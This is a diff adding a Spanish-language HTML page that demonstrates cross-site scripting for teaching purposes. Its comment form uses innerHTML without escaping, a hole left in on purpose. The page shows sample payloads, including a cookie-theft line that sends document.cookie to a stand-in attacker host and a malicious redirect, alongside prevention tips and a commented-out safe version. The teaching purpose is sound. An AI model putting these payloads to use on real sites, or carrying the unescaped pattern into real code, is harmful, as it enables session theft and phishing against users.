@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blog Vulnerable - Ejemplo Educativo XSS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-left: 4px solid #ffc107;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .danger {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-left: 4px solid #dc3545;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        .blog-post {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .comment-section {
+            margin-top: 30px;
+            padding: 20px;
+            background: #e9ecef;
+            border-radius: 8px;
+        }
+        .comment {
+            background: white;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border-left: 3px solid #007bff;
+        }
+        .comment-form {
+            margin-top: 20px;
+        }
+        .comment-form textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            resize: vertical;
+        }
+        .comment-form button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .comment-form button:hover {
+            background-color: #0056b3;
+        }
+        .payload-examples {
+            background: #f1f3f4;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .payload {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+        .demo-section {
+            border: 2px dashed #dc3545;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        .safe-demo {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 Demostración de Ataque XSS (Cross-Site Scripting)</h1>
+        
+        <div class="warning">
+            <strong>⚠️ ADVERTENCIA:</strong> Este es un ejemplo educativo para demostrar vulnerabilidades. 
+            NUNCA realices estos ataques en sitios web reales sin autorización.
+        </div>
+
+        <div class="blog-post">
+            <h2>Artículo del Blog: "Seguridad en Aplicaciones Web"</h2>
+            <p>Las aplicaciones web modernas enfrentan múltiples amenazas de seguridad. Una de las más comunes es el Cross-Site Scripting (XSS), que permite a los atacantes ejecutar código malicioso en el navegador de las víctimas.</p>
+            <p><em>Publicado el 7 de julio de 2025</em></p>
+        </div>
+
+        <div class="comment-section">
+            <h3>💬 Comentarios (Sección Vulnerable)</h3>
+            <p><strong>Esta sección simula un blog vulnerable que NO valida ni sanitiza las entradas del usuario.</strong></p>
+            
+            <div class="comment-form">
+                <h4>Deja tu comentario:</h4>
+                <textarea id="commentInput" placeholder="Escribe tu comentario aquí..."></textarea>
+                <button onclick="addComment()">Publicar Comentario</button>
+            </div>
+
+            <div id="commentsContainer">
+                <div class="comment">
+                    <strong>Usuario Normal:</strong> ¡Muy buen artículo! Me ayudó a entender mejor estos conceptos.
+                </div>
+            </div>
+        </div>
+
+        <div class="demo-section">
+            <h3>🔍 Ejemplos de Payloads Maliciosos</h3>
+            <p>Estos son ejemplos de código que un atacante podría intentar inyectar:</p>
+            
+            <div class="payload-examples">
+                <h4>1. Alerta Simple:</h4>
+                <div class="payload">&lt;script&gt;alert('¡Has sido pwned!');&lt;/script&gt;</div>
+                
+                <h4>2. Redirección Maliciosa:</h4>
+                <div class="payload">&lt;script&gt;window.location.href='https://sitio-malicioso.com';&lt;/script&gt;</div>
+                
+                <h4>3. Robo de Cookies/Sesión:</h4>
+                <div class="payload">&lt;script&gt;fetch('https://atacante.com/robar?cookie='+document.cookie);&lt;/script&gt;</div>
+                
+                <h4>4. Inyección de Contenido:</h4>
+                <div class="payload">&lt;img src="x" onerror="alert('XSS via imagen')"&gt;</div>
+            </div>
+        </div>
+
+        <div class="danger">
+            <h3>🎯 ¿Qué puede hacer un atacante?</h3>
+            <ul>
+                <li><strong>Robar credenciales:</strong> Capturar nombres de usuario y contraseñas</li>
+                <li><strong>Secuestrar sesiones:</strong> Usar las cookies de sesión de la víctima</li>
+                <li><strong>Redireccionar a sitios maliciosos:</strong> Phishing y malware</li>
+                <li><strong>Modificar contenido:</strong> Desfigurar el sitio web</li>
+                <li><strong>Crear botnets:</strong> Controlar navegadores de múltiples usuarios</li>
+                <li><strong>Ataques CSRF:</strong> Realizar acciones en nombre del usuario</li>
+            </ul>
+        </div>
+
+        <div class="safe-demo">
+            <h3>✅ Cómo Prevenir XSS</h3>
+            <ul>
+                <li><strong>Validación de entrada:</strong> Verificar que los datos sean del tipo esperado</li>
+                <li><strong>Escapar caracteres especiales:</strong> Convertir &lt; &gt; " ' & en entidades HTML</li>
+                <li><strong>Sanitización:</strong> Remover o neutralizar código potencialmente peligroso</li>
+                <li><strong>Content Security Policy (CSP):</strong> Restricciones del navegador</li>
+                <li><strong>Validación en servidor:</strong> Nunca confiar solo en validación del cliente</li>
+            </ul>
+        </div>
+
+        <div class="warning">
+            <h3>🧪 Prueba Segura</h3>
+            <p>Puedes probar algunos de los payloads de arriba en el campo de comentarios para ver cómo funciona un ataque XSS. 
+            Recuerda: esto es solo para fines educativos y en un entorno controlado.</p>
+        </div>
+    </div>
+
+    <script>
+        function addComment() {
+            const commentInput = document.getElementById('commentInput');
+            const commentsContainer = document.getElementById('commentsContainer');
+            
+            if (commentInput.value.trim() === '') {
+                alert('Por favor escribe un comentario');
+                return;
+            }
+
+            // VULNERABILIDAD INTENCIONAL: No se valida ni escapa el contenido
+            // En una aplicación real, NUNCA hagas esto:
+            const commentDiv = document.createElement('div');
+            commentDiv.className = 'comment';
+            commentDiv.innerHTML = `<strong>Usuario Anónimo:</strong> ${commentInput.value}`;
+            
+            commentsContainer.appendChild(commentDiv);
+            commentInput.value = '';
+            
+            // Aviso educativo
+            setTimeout(() => {
+                console.log('🚨 DEMOSTRACIÓN: En una aplicación real, el contenido debe ser sanitizado antes de mostrarse');
+            }, 100);
+        }
+
+        // Ejemplo de cómo debería hacerse (versión segura comentada)
+        /*
+        function addCommentSafe() {
+            const commentInput = document.getElementById('commentInput');
+            const commentsContainer = document.getElementById('commentsContainer');
+            
+            if (commentInput.value.trim() === '') {
+                alert('Por favor escribe un comentario');
+                return;
+            }
+
+            // VERSIÓN SEGURA: Escapar caracteres especiales
+            const commentDiv = document.createElement('div');
+            commentDiv.className = 'comment';
+            commentDiv.innerHTML = `<strong>Usuario Anónimo:</strong> ${escapeHtml(commentInput.value)}`;
+            
+            commentsContainer.appendChild(commentDiv);
+            commentInput.value = '';
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        */
+    </script>
+</body>
+</html>
